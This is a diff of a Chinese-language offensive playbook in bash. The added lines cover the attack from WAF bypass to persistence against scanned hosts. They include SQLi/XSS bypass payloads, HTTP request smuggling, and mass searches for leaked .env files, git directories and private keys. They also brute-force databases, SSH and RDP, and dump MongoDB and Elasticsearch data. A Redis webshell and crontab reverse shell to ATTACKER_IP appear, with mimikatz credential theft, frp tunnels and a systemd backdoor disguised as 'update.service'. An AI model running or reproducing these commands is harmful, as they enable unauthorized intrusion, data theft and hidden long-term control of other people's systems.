+        "1'/*!50000UNION*//*!50000SELECT*/1,2,3--" \
+        "1'\u0027OR\u00201=1--" \
+        "1'||'1'='1" \
+        "1'OR'x'='x" \
+        "1'OR/**/true--" \
+        "1'%23%0aOR%231=1--"; do
+        curl -sk "$url?id=$payload" | grep -qiv "blocked\|forbidden\|waf" && echo "[✅ Bypass] $payload"
     done
-    sleep 5
-done
+    
+    # XSS WAF绕过（10种payload）
+    for payload in \
+        "<ScRiPt>alert(1)</sCrIpT>" \
+        "<svg/onload=alert(1)>" \
+        "<img src=x onerror=alert(1)>" \
+        "<iframe src=javascript:alert(1)>" \
+        "<script>\u0061lert(1)</script>" \
+        "<script>eval(atob('YWxlcnQoMSk='))</script>" \
+        "<body onload=alert(1)>" \
+        "<details open ontoggle=alert(1)>" \
+        "<marquee onstart=alert(1)>" \
+        "<input onfocus=alert(1) autofocus>"; do
+        curl -sk "$url?q=$payload" | grep -qiv "blocked\|forbidden" && echo "[✅ XSS Bypass] $payload"
+    done
+done > waf_bypass_results.txt &
 
-echo "[+] WAF测试完成"
+# 6.3 Cloudflare专项绕过
+cat alive_full.txt | grep -i cloudflare | awk '{print $1}' | while read cf_url; do
+    # 真实IP发现
+    for subdomain in direct origin backend internal; do
+        dig +short ${subdomain}.$(echo $cf_url | awk -F/ '{print $3}') | grep -E "^[0-9]" >> cf_real_ips.txt
+    done
+    
+    # 历史IP查询
+    curl -s "https://securitytrails.com/domain/$(echo $cf_url | awk -F/ '{print $3}')/history/a" | \
+        grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" >> cf_real_ips.txt
+done &
 
-### 第7步：目录扫描（30分钟 - 低速）
-echo "[+] 目录扫描（低速）"
+# 6.4 协议走私检测（HTTP Request Smuggling）
+cat priority_A_high.txt | awk '{print $1}' | head -10 | while read url; do
+    # CL.TE
+    curl -sk "$url" -X POST -H "Content-Length: 5" -H "Transfer-Encoding: chunked" -d "0
 
-cat priority_A_high.txt 2>/dev/null | head -10 | while read url; do
-    echo "  扫描: $url"
-    ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirb/common.txt \
-        -mc 200,301,302 -t 3 -rate 5 -silent
-    sleep 10
-done
+GET /admin HTTP/1.1
+Host: localhost
+"
+    
+    # TE.CL
+    curl -sk "$url" -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 4" -d "0
+
+GET /admin HTTP/1.1
+Host: localhost
+"
+done > smuggling_results.txt &
+
+wait
+
+echo "[+] WAF绕过完成"
+sort -u cf_real_ips.txt > cf_real_ips_uniq.txt
+```
+
+### 第7步：智能目录扫描 + 敏感路径发现（15分钟）
+
+```bash
+# 7.1 根据技术栈定向扫描（最高效）
+scan_by_tech() {
+    local url=$1
+    local tech=$2
+    
+    case $tech in
+        "WordPress")
+            wpscan --url "$url" --enumerate p,t,u --api-token $WPSCAN_API
+            ffuf -u "$url/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -mc 200,301,302 -t 50
+            ;;
+        "Laravel")
+            ffuf -u "$url/FUZZ" -w <(echo -e ".env\napp/config/database.php\nstorage/logs/laravel.log") -mc 200
+            ;;
+        "Spring")
+            ffuf -u "$url/actuator/FUZZ" -w <(echo -e "env\nheapdump\nthreaddump\nmetrics\nhealth") -mc 200
+            ;;
+        "Jenkins")
+            curl -sk "$url/script" -d "script=println('test')" | grep -q "Result" && echo "[✅ Jenkins RCE] $url"
+            ;;
+        *)
+            ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+                -mc 200,301,302,403 -fc 404 -t 100 -timeout 10 -s
+            ;;
+    esac
+}
+
+# 并发扫描不同技术栈
+cat tech_stack.txt | while read line; do
+    url=$(echo $line | awk '{print $1}')
+    tech=$(echo $line | grep -oE "WordPress|Laravel|Spring|Jenkins|Joomla|Drupal")
+    [ -n "$tech" ] && scan_by_tech "$url" "$tech" &
+done &
+
+# 7.2 API路径爆破（专用字典）
+cat api_sites.txt | head -20 | while read api_url; do
+    ffuf -u "$api_url/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+        -mc 200,401,403,500 -t 100 -silent &
+    
+    ffuf -u "$api_url/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+        -mc 200,401,403,500 -t 100 -silent &
+done &
+
+# 7.3 管理后台路径爆破
+cat priority_A_high.txt | awk '{print $1}' | while read url; do
+    for path in admin administrator manage panel console backend dashboard control cpanel phpmyadmin \
+                manager admin.php admin.html wp-admin admincp admin_area admin_login; do
+        curl -sk "$url/$path" -o /dev/null -w "%{http_code} $url/$path\n" | grep -E "^200|^301|^302" >> admin_paths.txt
+    done &
+done &
+
+# 7.4 备份文件智能爆破（根据真实文件生成）
+cat alive_full.txt | awk '{print $1}' | head -30 | while read url; do
+    # 发现真实文件
+    curl -sk "$url" | grep -oE "href=['\"]([^'\"]+\.(php|asp|aspx|jsp))" | cut -d'"' -f2 | while read file; do
+        base=$(basename $file .${file##*.})
+        ext=${file##*.}
+        
+        # 生成备份变种
+        for suffix in .bak .old .backup .orig .save .swp ~ .1; do
+            curl -sk "$url/$base$suffix.$ext" -o /dev/null -w "%{http_code} $url/$base$suffix.$ext\n" | grep "^200"
+        done
+    done
+done > backup_files.txt &
+
+wait
 
 echo "[+] 目录扫描完成"
+echo "    管理后台: $(wc -l < admin_paths.txt)"
+echo "    备份文件: $(wc -l < backup_files.txt)"
+```
 
-### 第8步：文件泄漏（20分钟）
-echo "[+] 文件泄漏检测"
+### 第8步：全面文件泄漏检测（15分钟 - 100+检测点）
 
-cat alive_full.txt 2>/dev/null | head -20 | while read url; do
-    for file in .git/config .env config.php web.config; do
-        sleep 1
-        status=$(curl -sk "$url/$file" -o /dev/null -w "%{http_code}" -A "Mozilla/5.0")
-        [ "$status" = "200" ] && echo "[✅ 泄漏] $url/$file"
+```bash
+# 8.1 源码泄漏（多种VCS）
+cat alive_full.txt | awk '{print $1}' | while read url; do
+    (
+    # Git泄漏
+    for path in .git/config .git/HEAD .git/index .git/logs/HEAD; do
+        curl -sk "$url/$path" -o /dev/null -w "%{http_code} $url/$path\n" | grep "^200" && echo "[✅ Git泄露] $url/$path"
     done
-    sleep 3
+    
+    # SVN泄漏
+    for path in .svn/entries .svn/wc.db .svn/all-wcprops; do
+        curl -sk "$url/$path" -o /dev/null -w "%{http_code}\n" | grep -q "^200" && echo "[✅ SVN泄露] $url/$path"
+    done
+    
+    # Hg泄漏
+    curl -sk "$url/.hg/store/00manifest.i" -o /dev/null -w "%{http_code}\n" | grep -q "^200" && echo "[✅ Hg泄露] $url"
+    
+    # DS_Store
+    curl -sk "$url/.DS_Store" -o "/tmp/ds_$(echo $url | md5sum | cut -d' ' -f1)" && \
+        strings "/tmp/ds_$(echo $url | md5sum | cut -d' ' -f1)" | grep -E "\.(php|asp|aspx|jsp|sql)" && echo "[✅ DS_Store泄露] $url"
+    ) &
+done > vcs_leaks.txt &
+
+# 8.2 配置文件泄漏（50+个）
+cat alive_full.txt | awk '{print $1}' | while read url; do
+    for conf in \
+        .env .env.local .env.production .env.development \
+        config.php config.inc.php configuration.php \
+        database.yml database.php db.php \
+        web.config Web.config \
+        application.properties application.yml \
+        settings.py local_settings.py \
+        config.json package.json composer.json \
+        .htaccess .htpasswd \
+        wp-config.php wp-config.php.bak \
+        config/database.yml config/secrets.yml \
+        app/config/parameters.yml \
+        .git-credentials .npmrc .dockercfg; do
+        curl -sk "$url/$conf" -o /dev/null -w "%{http_code} $conf\n" | grep "^200" >> "config_leaks_$(echo $url | md5sum | cut -d' ' -f1).txt"
+    done &
+done &
+
+# 8.3 备份文件深度爆破
+cat alive_full.txt | awk '{print $1}' | head -50 | while read url; do
+    domain=$(echo $url | awk -F/ '{print $3}' | cut -d: -f1)
+    
+    for name in $domain backup www wwwroot web site database db sql data; do
+        for ext in zip tar tar.gz tgz rar 7z bak sql old; do
+            curl -sk "$url/$name.$ext" -o /dev/null -w "%{http_code} $url/$name.$ext\n" | grep "^200" >> backup_archives.txt
+        done
+    done &
+done &
+
+# 8.4 日志文件（30+个）
+cat alive_full.txt | awk '{print $1}' | while read url; do
+    for log in \
+        error.log access.log debug.log laravel.log \
+        app.log application.log system.log \
+        nginx/access.log nginx/error.log \
+        apache/access.log apache/error.log \
+        logs/error.log logs/access.log \
+        log/production.log log/development.log \
+        storage/logs/laravel.log \
+        var/log/nginx/access.log; do
+        curl -sk "$url/$log" -o /dev/null -w "%{http_code} $log\n" | grep "^200"
+    done
+done > log_files.txt &
+
+# 8.5 密钥文件
+cat alive_full.txt | awk '{print $1}' | while read url; do
+    for key in \
+        id_rsa id_rsa.pub authorized_keys \
+        .ssh/id_rsa .ssh/id_rsa.pub \
+        server.key private.key privatekey.pem \
+        ssl/private.key cert.pem; do
+        curl -sk "$url/$key" | grep -q "BEGIN.*PRIVATE KEY" && echo "[✅ 私钥泄露] $url/$key"
+    done
+done > key_leaks.txt &
+
+wait
+
+echo "[+] 文件泄漏检测完成"
+echo "    VCS泄漏: $(wc -l < vcs_leaks.txt)"
+echo "    配置文件: $(cat config_leaks_*.txt 2>/dev/null | wc -l)"
+echo "    备份文件: $(wc -l < backup_archives.txt)"
+echo "    日志文件: $(wc -l < log_files.txt)"
+echo "    密钥泄露: $(wc -l < key_leaks.txt)"
+```
+
+### 第9步：CDN穿透 + 真实IP定位（10分钟 - 多种方法）
+
+```bash
+# 9.1 CDN识别
+cat alive_full.txt | awk '{print $1}' | while read url; do
+    domain=$(echo $url | awk -F/ '{print $3}' | cut -d: -f1)
+    cdn=$(dig +short $domain | xargs -I {} whois {} | grep -iE "cloudflare|akamai|cloudfront|fastly|incapsula")
+    [ -n "$cdn" ] && echo "$domain|$cdn" >> cdn_list.txt
 done
 
-echo "[+] 文件泄漏完成"
-
-### 第9步：CDN穿透（15分钟）
-echo "[+] CDN穿透"
-
-cat alive_full.txt 2>/dev/null | head -10 | while read url; do
-    domain=$(echo $url | awk -F/ '{print $3}')
-    # 子域名查真实IP
-    dig +short dev.$domain test.$domain 2>/dev/null | grep -E "^[0-9]"
-    sleep 5
-done > real_ips.txt
-
-echo "[+] CDN穿透完成，真实IP: $(wc -l < real_ips.txt)"
-
-### 第10步：端口扫描（30分钟 - 降速）
-echo "[+] 端口扫描（低速）"
-
-cat real_ips.txt 2>/dev/null | head -10 | while read ip; do
-    echo "  扫描: $ip"
-    nmap -p 22,80,443,3306,6379,8080 --open $ip -oN "nmap_$ip.txt" 2>/dev/null
-    sleep 15
+# 9.2 历史DNS记录（多来源）
+cat cdn_list.txt | cut -d'|' -f1 | while read domain; do
+    (
+    # SecurityTrails
+    curl -s "https://api.securitytrails.com/v1/history/$domain/dns/a" \
+        -H "APIKEY: $SECURITYTRAILS_API" | jq -r '.records[].values[].ip' >> "history_$domain.txt"
+    
+    # ViewDNS
+    curl -s "https://viewdns.info/iphistory/?domain=$domain" | \
+        grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" >> "history_$domain.txt"
+    
+    # 证书查询真实IP
+    curl -s "https://crt.sh/?q=$domain&output=json" | jq -r '.[].issuer_name' | while read issuer; do
+        dig +short $issuer >> "history_$domain.txt"
+    done
+    ) &
 done
+wait
+
+# 9.3 子域名真实IP探测
+cat all_subdomains.txt | while read subdomain; do
+    # 直接DNS查询
+    ip=$(dig +short $subdomain @8.8.8.8 | grep -E "^[0-9]" | head -1)
+    
+    # 检查是否为真实IP（非CDN）
+    if [ -n "$ip" ]; then
+        # 测试直接IP访问
+        curl -sk "https://$ip" -H "Host: $subdomain" --connect-timeout 5 | \
+            grep -q "title\|html" && echo "$subdomain|$ip|[✅ 真实IP]" >> real_ips.txt
+    fi
+done &
+
+# 9.4 国际DNS查询（不同地区可能返回真实IP）
+cat cdn_list.txt | cut -d'|' -f1 | while read domain; do
+    for dns in 1.1.1.1 8.8.8.8 114.114.114.114 223.5.5.5 208.67.222.222; do
+        dig +short $domain @$dns | grep -E "^[0-9]"
+    done | sort -u >> "dns_$domain.txt"
+done &
+
+# 9.5 SSL证书CN/SAN字段提取（发现真实服务器）
+cat cdn_list.txt | cut -d'|' -f1 | while read domain; do
+    echo | openssl s_client -connect $domain:443 -servername $domain 2>/dev/null | \
+        openssl x509 -noout -text | grep -E "DNS:|CN=" | grep -oE "[a-zA-Z0-9.-]+\.$domain" >> "ssl_domains_$domain.txt"
+done &
+
+# 9.6 从JS文件提取内网IP/真实IP
+cat js_files/*.js 2>/dev/null | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | \
+    grep -vE "^0\.|^127\.|^255\.|^224\.|^10\.0\.0\.|^192\.168\.0\." | sort -u > ips_from_js.txt
+
+# 9.7 邮件服务器IP（通常是真实IP）
+cat cdn_list.txt | cut -d'|' -f1 | while read domain; do
+    dig +short MX $domain | awk '{print $2}' | while read mx; do
+        dig +short $mx | grep -E "^[0-9]" >> "mx_ips_$domain.txt"
+    done
+done &
+
+wait
+
+# 9.8 汇总所有真实IP
+cat history_*.txt dns_*.txt ssl_domains_*.txt mx_ips_*.txt real_ips.txt ips_from_js.txt 2>/dev/null | \
+    grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u > all_real_ips.txt
+
+echo "[+] CDN穿透完成"
+echo "    CDN域名: $(wc -l < cdn_list.txt)"
+echo "    真实IP: $(wc -l < all_real_ips.txt)"
+```
+
+### 第10步：全端口扫描 + 服务深度识别（20分钟）
+
+```bash
+# 10.1 超高速端口扫描（masscan + nmap组合）
+cat all_real_ips.txt | while read ip; do
+    (
+    # masscan快速全端口（10秒内）
+    masscan -p1-65535 $ip --rate=10000 --open -oL "masscan_$ip.txt"
+    
+    # 提取开放端口
+    ports=$(cat "masscan_$ip.txt" | grep "^open" | awk '{print $3}' | tr '\n' ',' | sed 's/,$//')
+    
+    # nmap深度服务识别
+    [ -n "$ports" ] && nmap -p $ports -sV -sC --script=vuln,exploit -A --open $ip -oN "nmap_$ip.txt"
+    ) &
+    
+    # 限制并发
+    [ $(jobs -r | wc -l) -ge 10 ] && wait -n
+done
+wait
+
+# 10.2 服务分类（智能归类）
+cat nmap_*.txt | grep "^[0-9]" | while read line; do
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    service=$(echo $line | grep -oE "ssh|mysql|redis|mongodb|postgresql|mssql|oracle|ftp|smtp|pop3|imap|rdp|vnc|telnet|http|https|elasticsearch|jenkins|tomcat|jboss")
+    
+    case $service in
+        mysql) echo $line >> mysql_services.txt ;;
+        redis) echo $line >> redis_services.txt ;;
+        mongodb) echo $line >> mongodb_services.txt ;;
+        postgresql) echo $line >> postgresql_services.txt ;;
+        mssql) echo $line >> mssql_services.txt ;;
+        ssh) echo $line >> ssh_services.txt ;;
+        ftp) echo $line >> ftp_services.txt ;;
+        rdp) echo $line >> rdp_services.txt ;;
+        elasticsearch) echo $line >> es_services.txt ;;
+        *) echo $line >> other_services.txt ;;
+    esac
+done
+
+# 10.3 C段扫描（扩大攻击面）
+cat all_real_ips.txt | awk -F. '{print $1"."$2"."$3".0/24"}' | sort -u | while read subnet; do
+    masscan -p 80,443,8080,8443,3306,6379,27017,9200,22,3389,445,1433,5432 $subnet --rate=50000 -oL "masscan_subnet_$subnet.txt" &
+done &
+
+wait
 
 echo "[+] 端口扫描完成"
+echo "    MySQL: $(wc -l < mysql_services.txt 2>/dev/null)"
+echo "    Redis: $(wc -l < redis_services.txt 2>/dev/null)"
+echo "    MongoDB: $(wc -l < mongodb_services.txt 2>/dev/null)"
+echo "    SSH: $(wc -l < ssh_services.txt 2>/dev/null)"
+```
 
-### 第11步：服务攻击（40分钟 - 串行）
-echo "[+] 服务攻击"
+### 第11步：端口服务全面攻击（30分钟 - 最全攻击库）
 
-# MySQL
-grep "3306" nmap_*.txt 2>/dev/null | while read line; do
-    ip=$(echo $line | cut -d_ -f2 | cut -d. -f1-4)
-    echo "  MySQL: $ip"
-    mysql -h $ip -u root -e "SELECT 1;" 2>/dev/null && echo "[✅ MySQL空密码] $ip"
-    sleep 5
-done
+```bash
+# 11.1 MySQL深度攻击
+[ -f mysql_services.txt ] && cat mysql_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 弱口令爆破（常见密码）
+    hydra -L <(echo -e "root\nadmin\nmysql") -P <(echo -e "root\nadmin\n123456\npassword\n\nroot123\nadmin123\nmysql") \
+        mysql://$ip:$port -t 4 -f -o "mysql_crack_$ip.txt"
+    
+    # 空密码
+    mysql -h $ip -P $port -u root -e "SELECT VERSION();" && echo "[✅ MySQL空密码] $ip:$port"
+    
+    # UDF提权（如果有权限）
+    mysql -h $ip -P $port -u root -ppassword -e "SELECT * FROM mysql.func;" 2>/dev/null && echo "[✅ MySQL UDF可能] $ip:$port"
+    ) &
+done &
 
-# Redis
-grep "6379" nmap_*.txt 2>/dev/null | while read line; do
-    ip=$(echo $line | cut -d_ -f2 | cut -d. -f1-4)
-    echo "  Redis: $ip"
-    redis-cli -h $ip INFO 2>/dev/null | grep -q "redis_version" && echo "[✅ Redis未授权] $ip"
-    sleep 5
-done
+# 11.2 Redis深度攻击
+[ -f redis_services.txt ] && cat redis_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 未授权访问
+    redis-cli -h $ip -p $port INFO 2>/dev/null && echo "[✅ Redis未授权] $ip:$port" && \
+    {
+        # 写入WebShell
+        redis-cli -h $ip -p $port CONFIG GET dir
+        redis-cli -h $ip -p $port CONFIG SET dir /var/www/html
+        redis-cli -h $ip -p $port CONFIG SET dbfilename shell.php
+        redis-cli -h $ip -p $port SET x "<?php system(\$_GET['c']); ?>"
+        redis-cli -h $ip -p $port SAVE
+        echo "[✅ Redis WebShell写入] $ip:$port"
+        
+        # 写入SSH公钥
+        redis-cli -h $ip -p $port CONFIG SET dir /root/.ssh
+        redis-cli -h $ip -p $port CONFIG SET dbfilename authorized_keys
+        redis-cli -h $ip -p $port SET x "ssh-rsa YOUR_PUBLIC_KEY"
+        redis-cli -h $ip -p $port SAVE
+        echo "[✅ Redis SSH公钥写入] $ip:$port"
+        
+        # Crontab反弹shell
+        redis-cli -h $ip -p $port CONFIG SET dir /var/spool/cron
+        redis-cli -h $ip -p $port CONFIG SET dbfilename root
+        redis-cli -h $ip -p $port SET x "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+        redis-cli -h $ip -p $port SAVE
+        echo "[✅ Redis Crontab写入] $ip:$port"
+    }
+    
+    # 弱口令爆破
+    hydra -P <(echo -e "redis\n123456\npassword\nroot\nadmin") redis://$ip:$port -t 4
+    ) &
+done &
 
-# SSH爆破（仅测试3个密码）
-grep "22" nmap_*.txt 2>/dev/null | head -5 | while read line; do
-    ip=$(echo $line | cut -d_ -f2 | cut -d. -f1-4)
-    for pass in root admin 123456; do
-        sleep 3
-        sshpass -p $pass ssh -o StrictHostKeyChecking=no root@$ip "whoami" 2>/dev/null && \
-            echo "[✅ SSH] $ip root:$pass"
-    done
-    sleep 10
-done
+# 11.3 MongoDB深度攻击
+[ -f mongodb_services.txt ] && cat mongodb_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 未授权访问
+    mongo --host $ip --port $port --eval "db.adminCommand('listDatabases')" 2>/dev/null && \
+    echo "[✅ MongoDB未授权] $ip:$port" && \
+    {
+        # 导出所有数据库
+        mongo --host $ip --port $port --eval "db.adminCommand('listDatabases')" | grep -oE '"name" : "[^"]+' | cut -d'"' -f4 | while read db; do
+            mongoexport --host $ip --port $port --db $db --collection users --out "mongo_${ip}_${db}_users.json"
+        done
+        echo "[✅ MongoDB数据导出] $ip:$port"
+    }
+    ) &
+done &
+
+# 11.4 PostgreSQL攻击
+[ -f postgresql_services.txt ] && cat postgresql_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    # 弱口令
+    hydra -L <(echo -e "postgres\npostgresql") -P <(echo -e "postgres\npassword\nadmin\n123456") \
+        postgres://$ip:$port -t 4 &
+done &
+
+# 11.5 SSH暴力破解（智能字典）
+[ -f ssh_services.txt ] && cat ssh_services.txt | head -20 | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 常见用户名+密码组合
+    hydra -L <(echo -e "root\nadmin\nubuntu\ncentos\nuser") \
+          -P <(echo -e "root\nadmin\n123456\npassword\n123456789\nroot123\nadmin123\nP@ssw0rd\n123qwe\nqwerty") \
+          ssh://$ip:$port -t 4 -f -o "ssh_crack_$ip.txt"
+    ) &
+done &
+
+# 11.6 RDP暴力破解
+[ -f rdp_services.txt ] && cat rdp_services.txt | head -10 | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    hydra -L <(echo -e "administrator\nadmin\nAdministrator") \
+          -P <(echo -e "admin\npassword\nP@ssw0rd\nadmin123\nAdmin123") \
+          rdp://$ip:$port -t 4 &
+done &
+
+# 11.7 Elasticsearch未授权
+[ -f es_services.txt ] && cat es_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 未授权访问
+    curl -sk "http://$ip:$port/_cat/indices" 2>/dev/null && echo "[✅ ES未授权] $ip:$port" && \
+    {
+        # 导出所有索引
+        curl -sk "http://$ip:$port/_cat/indices?v" | tail -n +2 | awk '{print $3}' | while read index; do
+            curl -sk "http://$ip:$port/$index/_search?size=10000" > "es_${ip}_${index}.json"
+        done
+        echo "[✅ ES数据导出] $ip:$port"
+    }
+    ) &
+done &
+
+# 11.8 FTP匿名登录 + 弱口令
+[ -f ftp_services.txt ] && cat ftp_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 匿名登录
+    ftp -n $ip $port <<EOF 2>&1 | grep -q "230" && echo "[✅ FTP匿名] $ip:$port"
+user anonymous
+pass anonymous
+quit
+EOF
+    
+    # 弱口令
+    hydra -L <(echo -e "ftp\nadmin\nroot") -P <(echo -e "ftp\nadmin\nroot\n123456") ftp://$ip:$port -t 4
+    ) &
+done &
+
+# 11.9 SMB永恒之蓝 + 弱口令
+cat all_real_ips.txt | while read ip; do
+    (
+    # 永恒之蓝检测
+    nmap -p 445 --script smb-vuln-ms17-010 $ip | grep -q "VULNERABLE" && echo "[✅ EternalBlue] $ip"
+    
+    # SMB弱口令
+    crackmapexec smb $ip -u administrator -p 'password' 2>/dev/null | grep -q "+" && echo "[✅ SMB弱口令] $ip"
+    ) &
+done &
+
+# 11.10 MSSQL攻击
+[ -f mssql_services.txt ] && cat mssql_services.txt | while read line; do
+    ip=$(echo $line | awk '{print $2}')
+    port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
+    
+    (
+    # 弱口令
+    hydra -L <(echo -e "sa\nadministrator") -P <(echo -e "sa\npassword\nadmin\n123456") \
+        mssql://$ip:$port -t 4
+    
+    # xp_cmdshell RCE
+    mssqlclient.py sa:password@$ip -windows-auth -port $port -db master -q "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;" 2>/dev/null && \
+        echo "[✅ MSSQL xp_cmdshell] $ip:$port"
+    ) &
+done &
+
+wait
 
 echo "[+] 服务攻击完成"
+```
 
-### 第12步：内网准备（20分钟）
-echo "[+] 内网准备（假设已有shell）"
+### 第12步：内网渗透准备 + 横向扩展（20分钟）
 
-# 假设: SHELL_HOST=拿到的主机
-if [ -n "$SHELL_HOST" ]; then
-    echo "  上传工具..."
-    scp -o StrictHostKeyChecking=no /tools/fscan root@$SHELL_HOST:/tmp/ 2>/dev/null
-    sleep 5
+```bash
+# 假设已拿到一台shell: $COMPROMISED_HOST
+
+# 12.1 上传工具集（一键部署）
+upload_toolkit() {
+    local host=$1
     
-    echo "  内网扫描..."
-    ssh root@$SHELL_HOST "/tmp/fscan -h 192.168.0.0/16 -o /tmp/scan.txt" 2>/dev/null
-    sleep 60
+    # 上传常用工具
+    scp -o StrictHostKeyChecking=no /tools/fscan root@$host:/tmp/
+    scp /tools/frp/frpc root@$host:/tmp/
+    scp /tools/nps/npc root@$host:/tmp/
+    scp /tools/mimikatz.exe root@$host:/tmp/ 2>/dev/null
+    scp /tools/Rubeus.exe root@$host:/tmp/ 2>/dev/null
     
-    echo "  下载结果..."
-    scp root@$SHELL_HOST:/tmp/scan.txt ./internal_scan.txt 2>/dev/null
-fi
+    ssh root@$host "chmod +x /tmp/fscan /tmp/frpc /tmp/npc"
+}
 
-echo "[+] 内网准备完成"
+# 12.2 内网信息收集
+recon_internal() {
+    local host=$1
+    
+    ssh root@$host bash <<'ENDSSH'
+# 系统信息
+uname -a
+hostname
+whoami
+id
 
-### 第13步：持久化（15分钟）
-echo "[+] 持久化"
+# 网络信息
+ifconfig -a
+ip addr
+ip route
+arp -a
+netstat -antup
 
-if [ -n "$SHELL_HOST" ]; then
-    ssh root@$SHELL_HOST bash <<'EOF'
-# Crontab后门
-(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
+# 用户信息
+cat /etc/passwd
+cat /etc/shadow 2>/dev/null
+last -a
+w
+
+# 进程信息
+ps auxf
+netstat -antup | grep LISTEN
+
+# 计划任务
+crontab -l
+cat /etc/crontab
+ls /etc/cron.*
+
+# 敏感文件
+find / -name "*.conf" 2>/dev/null | head -50
+find / -name "*.sql" 2>/dev/null | head -50
+find / -name "*.db" 2>/dev/null | head -50
+find /home -name "*.txt" 2>/dev/null | head -50
+
+# 历史命令
+cat ~/.bash_history
+cat /root/.bash_history 2>/dev/null
 
 # SSH密钥
+cat ~/.ssh/id_rsa 2>/dev/null
+cat /root/.ssh/id_rsa 2>/dev/null
+find /home -name id_rsa 2>/dev/null
+
+# 数据库配置
+find /var/www -name "*config*.php" 2>/dev/null -exec grep -H "password" {} \;
+find /opt -name "*.properties" 2>/dev/null -exec grep -H "password" {} \;
+
+ENDSSH
+}
+
+# 12.3 建立代理通道
+setup_proxy() {
+    local host=$1
+    local attacker_ip="YOUR_ATTACKER_IP"
+    
+    # 启动frpc（客户端）
+    ssh root@$host "cat > /tmp/frpc.ini" <<EOF
+[common]
+server_addr = $attacker_ip
+server_port = 7000
+token = your_token
+
+[socks5]
+type = tcp
+remote_port = 1080
+plugin = socks5
+EOF
+    
+    ssh root@$host "nohup /tmp/frpc -c /tmp/frpc.ini > /dev/null 2>&1 &"
+    echo "[+] 代理已建立: socks5://127.0.0.1:1080"
+}
+
+# 12.4 内网扫描（通过代理）
+scan_internal() {
+    local host=$1
+    
+    ssh root@$host "/tmp/fscan -h 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 -np -no -nopoc -o /tmp/fscan_result.txt"
+    scp root@$host:/tmp/fscan_result.txt ./fscan_internal_$host.txt
+}
+
+# 12.5 横向移动（凭证复用）
+lateral_movement() {
+    local host=$1
+    
+    # 提取凭证
+    ssh root@$host "grep -r 'password\|passwd' /var/www /opt /home 2>/dev/null | grep -v Binary" > credentials_$host.txt
+    
+    # 测试凭证复用
+    cat credentials_$host.txt | grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | while read ip; do
+        # SSH尝试
+        sshpass -p "password_from_config" ssh -o StrictHostKeyChecking=no root@$ip "whoami" && \
+            echo "[✅ SSH横向成功] $ip"
+    done
+}
+
+# 12.6 Windows内网渗透（如果是Windows）
+windows_internal() {
+    local host=$1
+    
+    # 上传Windows工具
+    scp /tools/mimikatz.exe administrator@$host:C:\\Windows\\Temp\\
+    scp /tools/Rubeus.exe administrator@$host:C:\\Windows\\Temp\\
+    
+    # 远程执行
+    psexec.py administrator:password@$host "C:\\Windows\\Temp\\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
+}
+
+# 执行内网渗透
+[ -n "$COMPROMISED_HOST" ] && {
+    upload_toolkit $COMPROMISED_HOST
+    recon_internal $COMPROMISED_HOST > internal_recon_$COMPROMISED_HOST.txt
+    setup_proxy $COMPROMISED_HOST
+    scan_internal $COMPROMISED_HOST
+    lateral_movement $COMPROMISED_HOST
+}
+
+echo "[+] 内网渗透准备完成"
+```
+
+### 第13步：持久化 + 痕迹清理（15分钟）
+
+```bash
+# 13.1 Linux多重持久化
+linux_persistence() {
+    local host=$1
+    
+    ssh root@$host bash <<'ENDSSH'
+# Crontab（多个任务）
+(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
+(crontab -l 2>/dev/null; echo "0 */6 * * * curl http://ATTACKER_IP/shell.sh|bash") | crontab -
+
+# SSH公钥
 mkdir -p ~/.ssh
-echo "ssh-rsa YOUR_KEY" >> ~/.ssh/authorized_keys
+echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
-# 清理痕迹
+# 系统服务
+cat > /etc/systemd/system/update.service <<EOF
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable update.service
+systemctl start update.service
